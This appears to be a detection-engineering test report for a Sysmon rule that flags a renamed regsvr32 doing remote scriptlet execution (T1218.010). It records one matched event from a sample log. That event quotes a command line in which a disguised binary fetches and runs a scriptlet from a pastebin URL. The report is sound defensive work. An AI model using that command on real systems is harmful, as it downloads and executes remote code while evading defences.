# Rule 6 - Renamed Regsvr32 Remote Scriptlet Execution

- Rule: win_renamed_regsvr32_remote_scriptlet
- MITRE ATT&CK: T1218.010 - Regsvr32
- Dataset: exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx
- Log source: Sysmon Event ID 1
- Events analyzed: 2
- Events matched: 1

## Matched Event

- Executable: C:\ProgramData\jabber.exe
- Description: Microsoft(C) Register Server
- Parent process: cmd.exe
- Command line: jabber.exe /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll
- User: IEWIN7\IEUser

## Assessment

The detection identified a renamed executable masquerading as the Windows Register Server and using remote scriptlet execution arguments.

The detection successfully matched the attack-oriented EVTX sample.

This is a positive test result. Benign testing and false-positive tuning remain pending.
